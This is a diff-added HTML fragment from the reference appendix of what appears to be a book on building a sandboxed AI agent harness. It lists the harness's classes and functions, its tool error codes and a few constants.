+<p>Each <code>mini_harness/demo.py</code> is a runnable walkthrough, not part of the public</p>
+
+<p>API. Run it with <code>python -m mini_harness.demo</code>.</p>
+
+<h3 id="s11-03">Alphabetical index</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Name</th><th>Chapter</th><th>Kind</th></tr>
+<tr><td><code>Agent</code></td><td>5</td><td>class</td></tr>
+<tr><td><code>AgentResult</code></td><td>5</td><td>dataclass</td></tr>
+<tr><td><code>AuditError</code></td><td>5</td><td>exception</td></tr>
+<tr><td><code>AuditLog</code></td><td>5</td><td>class</td></tr>
+<tr><td><code>CommandError</code></td><td>3</td><td>exception</td></tr>
+<tr><td><code>CommandPolicy</code></td><td>3</td><td>dataclass</td></tr>
+<tr><td><code>CommandResult</code></td><td>3</td><td>dataclass</td></tr>
+<tr><td><code>CommandRunner</code></td><td>3</td><td>class</td></tr>
+<tr><td><code>DirEntry</code></td><td>2</td><td>dataclass</td></tr>
+<tr><td><code>DockerConfig</code></td><td>4</td><td>dataclass</td></tr>
+<tr><td><code>DockerError</code></td><td>4</td><td>exception</td></tr>
+<tr><td><code>DockerRunner</code></td><td>4</td><td>class</td></tr>
+<tr><td><code>DockerToolSpec</code></td><td>5</td><td>dataclass</td></tr>
+<tr><td><code>Limits</code></td><td>2, 3</td><td>frozen dataclass</td></tr>
+<tr><td><code>Model</code></td><td>5</td><td>protocol</td></tr>
+<tr><td><code>ModelReply</code></td><td>5</td><td>frozen dataclass</td></tr>
+<tr><td><code>PathPolicy</code></td><td>1–5</td><td>class</td></tr>
+<tr><td><code>PolicyError</code></td><td>1–5</td><td>exception</td></tr>
+<tr><td><code>ResolvedPath</code></td><td>1–5</td><td>frozen dataclass</td></tr>
+<tr><td><code>RunResult</code></td><td>4</td><td>frozen dataclass</td></tr>
+<tr><td><code>RUN_COMMAND_SPEC</code></td><td>5</td><td>constant</td></tr>
+<tr><td><code>Sandbox</code></td><td>2, 5</td><td>class</td></tr>
+<tr><td><code>SandboxError</code></td><td>2, 5</td><td>exception</td></tr>
+<tr><td><code>ScriptedModel</code></td><td>5</td><td>class</td></tr>
+<tr><td><code>ToolSpec</code></td><td>2, 5</td><td>frozen dataclass</td></tr>
+<tr><td><code>Toolbox</code></td><td>5</td><td>class</td></tr>
+<tr><td><code>TOOL_SPECS</code></td><td>2, 5</td><td>constant</td></tr>
+<tr><td><code>default_command_policy()</code></td><td>3</td><td>function</td></tr>
+<tr><td><code>expand_variables(text, env=None)</code></td><td>1–5</td><td>function</td></tr>
+<tr><td><code>format_result(result)</code></td><td>3, 5</td><td>function</td></tr>
+<tr><td><code>realpath_best(path)</code></td><td>1–5</td><td>function</td></tr>
+<tr><td><code>resolve_real_executable(program)</code></td><td>3</td><td>function</td></tr>
+<tr><td><code>run_command_tool(runner, args)</code></td><td>3, 5</td><td>function</td></tr>
+<tr><td><code>run_demo(workspace, ...)</code></td><td>5</td><td>function</td></tr>
+<tr><td><code>run_shell(root, command, timeout=None)</code></td><td>0</td><td>unsafe function</td></tr>
+<tr><td><code>run_tool(sandbox, name, args=None)</code></td><td>2, 5</td><td>function</td></tr>
+<tr><td><code>tool_names()</code></td><td>2, 5</td><td>function</td></tr>
+</table></div>
+
+<h3 id="s11-04">Observation vocabulary</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Prefix</th><th>Meaning</th></tr>
+<tr><td><code>OK</code></td><td>The tool completed and the result is in the text.</td></tr>
+<tr><td><code>ERROR[ARGS]</code></td><td>Missing, wrong-typed or malformed tool arguments.</td></tr>
+<tr><td><code>ERROR[PATH]</code></td><td>The path policy refused the target.</td></tr>
+<tr><td><code>ERROR[NOT_FOUND]</code></td><td>The file or folder does not exist.</td></tr>
+<tr><td><code>ERROR[IS_DIR]</code> / <code>ERROR[NOT_DIR]</code></td><td>Wrong file type for the operation.</td></tr>
+<tr><td><code>ERROR[TOO_LARGE]</code></td><td>A byte or entry cap was exceeded.</td></tr>
+<tr><td><code>ERROR[EXISTS]</code></td><td>Create-only write hit an existing file.</td></tr>
+<tr><td><code>ERROR[NO_MATCH]</code> / <code>ERROR[AMBIGUOUS]</code></td><td>Edit text missing or repeated.</td></tr>
+<tr><td><code>ERROR[DENIED]</code></td><td>The command program is not allowlisted.</td></tr>
+<tr><td><code>ERROR[CWD]</code></td><td>The working directory is outside the workspace or missing.</td></tr>
+<tr><td><code>ERROR[TIMEOUT]</code></td><td>The command exceeded its wall-clock limit.</td></tr>
+<tr><td><code>ERROR[EXIT]</code></td><td>The command ran and returned non-zero.</td></tr>
+<tr><td><code>ERROR[DOCKER_MISSING]</code></td><td>The Docker CLI/daemon or image is unavailable.</td></tr>
+<tr><td><code>ERROR[EXIT]</code> (Docker)</td><td>The container command returned non-zero.</td></tr>
+<tr><td><code>ERROR[UNKNOWN_TOOL]</code></td><td>No tool with that name.</td></tr>
+<tr><td><code>ERROR[INTERNAL]</code></td><td>An unexpected tool bug was caught at the boundary.</td></tr>
+</table></div>
+
+<h3 id="s11-05">Constants worth knowing</h3>
+
+<div class="table-wrap"><table>
+<tr><th>Constant</th><th>Where</th><th>Value / purpose</th></tr>
+<tr><td><code>_WINDOWS_RESERVED</code></td><td>path policy</td><td><code>CON</code>, <code>PRN</code>, <code>AUX</code>, <code>NUL</code>, <code>COM1-9</code>, <code>LPT1-9</code></td></tr>
+<tr><td><code>MAX_VALUE_CHARS</code></td><td>audit</td><td>500-character audit truncation</td></tr>
+<tr><td><code>FILE_TOOL_NAMES</code></td><td>toolbox</td><td>derived file-tool dispatch set</td></tr>
+<tr><td><code>RUN_COMMAND_SPEC</code></td><td>docker tools</td><td>the command tool contract</td></tr>
+<tr><td><code>CHAPTER_DIR</code> / <code>DOCKER_DIR</code></td><td>cli</td><td><code>ch05</code> / <code>ch05/docker</code></td></tr>
+</table></div>
+
+</section>
+
+
+      <div class="colophon">
+        Built from book_html.md · six stages · four appendices
+      </div>
+    </div>
+  </main>
+</div>
+<script src="assets/explainer.js"></script>
+</body>
+</html>
